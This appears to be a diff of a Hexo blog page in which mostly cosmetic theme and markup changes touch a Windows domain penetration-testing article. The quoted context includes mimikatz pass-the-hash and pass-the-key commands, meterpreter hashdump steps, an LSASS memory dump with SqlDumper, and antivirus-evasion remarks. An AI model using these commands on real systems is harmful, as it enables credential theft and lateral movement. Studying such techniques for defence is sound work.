@@ -23,7 +23,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -183,7 +183,9 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2020-05-25 14:37:03
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-05-25 14:37:03</span>
+        <span class="mobile">2020-05-25 14:37</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -248,7 +250,7 @@
 <li>Client inputs username &amp; password, then request by sending plain text username to Server.</li>
 <li>Server receives request, and sends a random 16 bits (8 bits for NTLM v1, 16bits for NTLM v2) <code>challenge</code> number. Get it hashed by stored <code>NTLM Hash</code>, and saves as <code>challenge1</code>.</li>
 <li>Client receives <code>challenge</code>, and hashes it using local password hash as response (<code>challenge2</code>).</li>
-<li>Server receives response, compares <code>challenge1</code> and <code>challenge2</code> to auth.<h3 id="Kerberos-Protocol"><a href="#Kerberos-Protocol" class="headerlink" title="Kerberos Protocol"></a>Kerberos Protocol</h3><code>Kerberos</code> is a network auth protocol used in <code>Domain</code>, and it serves for C/S programs.<br>There are there roles in the <code>Kerberos</code> protocol:</li>
+<li>Server receives response, compares <code>challenge1</code> and <code>challenge2</code> to auth.<h3 id="Kerberos-Protocol"><a href="#Kerberos-Protocol" class="headerlink" title="Kerberos Protocol"></a>Kerberos Protocol</h3><code>Kerberos</code> is a network auth protocol used in <code>Domain</code>, and it serves for C&#x2F;S programs.<br>There are there roles in the <code>Kerberos</code> protocol:</li>
 </ol>
 <ul>
 <li>Client</li>
@@ -364,7 +366,7 @@
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span> \\target_ip\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
 <p>It’ll be successful.</p>
 <p>Actually <code>sekurlsa::pth</code> in <code>mimikatz</code> is called <code>Overpass-the-Hash</code>, aka <code>Pass-the-Key</code>.</p>
-<p>Note: “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”<br>Which means we can also conduct <code>PTH</code> with AES keys, if <code>kb2871997</code> is patched/installed.</p>
+<p>Note: “ntlm hash is mandatory on XP&#x2F;2003&#x2F;Vista&#x2F;2008 and before 7&#x2F;2008r2&#x2F;8&#x2F;2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1&#x2F;2012r2 or 7&#x2F;2008r2&#x2F;8&#x2F;2012 with kb2871997, in this case you can avoid ntlm hash.”<br>Which means we can also conduct <code>PTH</code> with AES keys, if <code>kb2871997</code> is patched&#x2F;installed.</p>
 <p>Still in <code>mimikatz</code>:</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:user_name /domain:domain_name /aes256: aes256_hmac&quot;</span> </span><br></pre></td></tr></table></figure>
 <h4 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h4><p>Because <code>PTH</code> of <code>mimikatz</code> needs privilege as Admin, <code>mimikatz</code> provides another way that dont need – <code>Pass-the-Ticket</code>. It requires a open source util: <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo"><code>kekeo</code></a>.</p>
@@ -434,12 +436,13 @@
 <li><p>As for <code>metasploit</code>, <code>meterpreter</code> has some built-in cmds:</p>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
 <p>  load <code>mimikatz</code> to do more:</p>
-  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz   <span class="comment"># necessary</span></span><br><span class="line">meterpreter &gt; msv</span><br><span class="line">meterpreter &gt; tspkg</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">meterpreter &gt; ssp</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure></li>
+  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz   <span class="comment"># necessary</span></span><br><span class="line">meterpreter &gt; msv</span><br><span class="line">meterpreter &gt; tspkg</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">meterpreter &gt; ssp</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>Windows Credentials Editor (WCE) is also famous to do intranet pentest. Download <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip" >x32<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip" >x64<i class="fas fa-external-link-alt"></i></a> or <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip" >universal<i class="fas fa-external-link-alt"></i></a>.</p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump"><code>Quarks PwDump</code></a> is kind of old, which used to be a stabe hash capturer.</p>
 </li>
-<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"><code>ProcDump</code></a> belongs to Windows Sysnternals Suite, which belongs to Microsoft now. Therefore it is able to bypass some antivirus softwares. Working with `mimikatz is talked <a href="#Normal-Ways">before</a></p>
+<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"><code>ProcDump</code></a> belongs to Windows Sysnternals Suite, which belongs to Microsoft now. Therefore it is able to bypass some antivirus softwares. Working with &#96;mimikatz is talked <a href="#Normal-Ways">before</a></p>
 </li>
 <li><p><code>SqlDumper.exe</code> is belong to Microsoft and exists in SQL Server directory, also capable for bypassing antivirus software.It is stored in <code>C:\Program Files\Microsoft SQL Server\number\Shared</code> by default, but if SQL Server is uninstalled, you have to upload. Use it like:</p>
   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /svc | findstr lsass.exe  <span class="comment"># see lsass.exe PID</span></span><br><span class="line">&gt; Sqldumper.exe ProcessID <span class="number">0</span> <span class="number">0</span>x01100  <span class="comment"># export dump hash</span></span><br><span class="line"><span class="comment"># then use mimmikatz (same OS version needed) to extract hash </span></span><br><span class="line">&gt; mimikatz.exe <span class="string">&quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
@@ -447,6 +450,24 @@
 
         </div>
 
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/windows/">#windows</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pentest/">#pentest</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/domain/">#domain</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -502,14 +523,16 @@
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2018</span>&nbsp;-&nbsp;
+              <span>2020</span>
+              -
             
             2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
         </div>
+        
         
     </div>
 </footer>
@@ -519,58 +542,19 @@
 
     
         <div class="post-tools">
-            $li-border-radius = 5px;
-$li-margin-bottom = 12px;
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
 
-.post-tools-container {
-
-  .tools-list {
-
-    li {
-      cursor: pointer;
-      width: $post-tool-button-width;
-      height: $post-tool-button-width;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: $li-margin-bottom;
-      background: var(--background-color);
-      color: var(--default-text-color);
-
-      i {
-        color: var(--default-text-color);
-      }
-
-      &:hover {
-        background: var(--primary-color);
-        color: var(--background-color);
-
-        i {
-          color: var(--background-color);
-        }
-      }
-
-
-      &:last-child {
-        margin-bottom: 0;
-      }
-
-
-      hover-style(true, 1.06, 1.06);
-
-      &.page-aside-toggle {
-        display: none;
-
-        +keep-tablet() {
-          display: none !important;
-        }
-      }
-    }
-  }
-
-}
+        <!-- go comment -->
+        
+    </ul>
+</div>
 
         </div>
     
@@ -629,43 +613,9 @@ $li-margin-bottom = 12px;
         </aside>
     
 
-    .image-viewer-container {
-  position: fixed;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 0, 0, 0);
-  visibility: hidden;
-  z-index: $z-index-8;
-  padding: 6%;
-  box-sizing: border-box;
-  transition-t("visibility, background", "0, 0", "0.3, 0.3", "ease, ease");
-
-  &.active {
-    background: rgba(0, 0, 0, 0.5);
-    visibility: visible;
-
-    img {
-      cursor: zoom-out;
-      transform: scale(1);
-      padding: 2px;
-      background: var(--background-color);
-    }
-  }
-
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    transform: scale(0);
-    transition-t("transform", "0", "0.3", "ease");
-  }
-}
-
-
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
